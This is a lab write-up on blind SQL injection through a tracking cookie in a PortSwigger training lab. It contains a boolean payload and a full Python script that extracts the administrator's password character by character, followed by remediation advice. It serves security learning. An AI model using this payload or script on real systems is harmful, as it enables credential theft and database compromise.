# Blind SQL Injection with Conditional Responses
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-24

## The Problem
Unlike every previous lab, the injection point here was not a URL parameter — it was the `TrackingId` cookie, sent with every request for analytics tracking. The application used this cookie's value inside a SQL query similar to:

```sql
SELECT * FROM tracking WHERE id = 'TrackingId_value'
```

More importantly, none of the query's results were ever reflected on the page — there was no error message, no extra data, and no visible change in page content based on the query's outcome. This is a **blind** SQL injection: the only observable signal is a binary difference in application behavior (in this case, whether the response contained "Welcome" — i.e. whether the session was treated as logged in).

## Discovery / Exploitation
Since nothing from the database is directly visible, the attack has to ask the database a series of true/false questions and infer the answer purely from how the application responds. The core payload:

```sql
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')='97'--
```

This asks: *"Is the ASCII value of the 1st character of the administrator's password equal to 97 (which is 'a')?"* If true, the injected condition holds, the query behaves as if login succeeded, and the response contains "Welcome". If false, it doesn't.

**Two nested loops make this exhaustive:**
- **Outer loop (`i`, 1–20):** the character position in the password
- **Inner loop (`j`, 32–126):** every printable ASCII value to test against that position

For each position, the script tries every possible character until it finds the one that makes the condition true, then moves to the next position — effectively reading the password one character at a time through a long series of true/false questions.

## Impact
Blind SQL injection demonstrates that the complete absence of any visible query output is not protection — as long as the application's *behavior* changes based on a query condition (even something as subtle as whether a session appears authenticated), the entire database can still be extracted, just more slowly than a direct UNION attack. This is a critical vulnerability since it enables full credential extraction with zero visible feedback from the application.

## Proof of Concept (Python)
This script automates the full character-by-character extraction, injecting the payload into the `TrackingId` cookie on every request and checking for "Welcome" in the response to determine each character.

```python
import sys
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,%s,1)) FROM users WHERE username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId': '10tbjWU3c3NuVpHa' + sqli_payload_encoded,
                'session': 'jeehJpbTAefY3LJFNMYCugWqRQVMJhtO'
            }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
    print()
    return password_extracted


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Retrieving administrator password....")
    sqli_password(url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Takes the target URL as a command-line argument
2. For each password position (1–20), tries every printable ASCII value (32–126) by injecting a true/false condition into the `TrackingId` cookie
3. URL-encodes the payload before sending, since it contains characters (spaces, quotes, parentheses) that aren't valid raw in a cookie header
4. Checks whether "Welcome" appears in the response — if it does, the current character is correct; the script appends it and moves to the next position
5. Prints the password live as it's discovered, showing the current guess in progress even before a character is confirmed (via the `chr(j)` appended in the "not found yet" branch), so the terminal shows continuous progress rather than appearing frozen

**Example run:**
```bash
python3 exploit_sqli_blind_password_extract.py https://your-lab-url.web-security-academy.net/filter?category=Gifts
```

**Debugging note:** The exact cookie name matters and is case-sensitive — this lab uses `TrackingId`, not `TrackId`. A mismatched cookie name means the payload never reaches the query, and the loop runs to completion without ever extracting a character (every response looks identical, since the injection has no effect at all). The `session` cookie value also needs to be current — log in fresh in the browser and copy both cookie values from DevTools before running the script.

## Remediation
- Use **parameterized queries (prepared statements)** — the same defense that applies to every prior lab, since it prevents the injected condition from ever being evaluated as SQL logic in the first place.
- Apply **consistent response behavior** regardless of internal query results where possible, to avoid leaking a true/false oracle through subtle behavioral differences.
- Apply **rate limiting** on requests — blind extraction requires hundreds to thousands of sequential requests, so aggressive rate limiting significantly raises the cost of this attack even if the underlying injection isn't fully fixed.
- Avoid using **unsanitized cookie values in SQL queries** — cookies are just as much user-controlled input as URL parameters or form fields, despite often being treated as "trusted" internal application data.

## Takeaway
This lab is a meaningful shift from every previous lab: there's no UNION, no visible data, and no error message to lean on — just a single true/false signal repeated thousands of times. It demonstrates that "the page doesn't show anything unusual" is not evidence of safety; any measurable difference in application behavior tied to a query condition is enough to fully compromise a database, given enough automated requests. It's also a reminder that injection points aren't limited to visible form fields and URL parameters — cookies, headers, and any other user-controlled value that reaches a SQL query are equally exploitable.
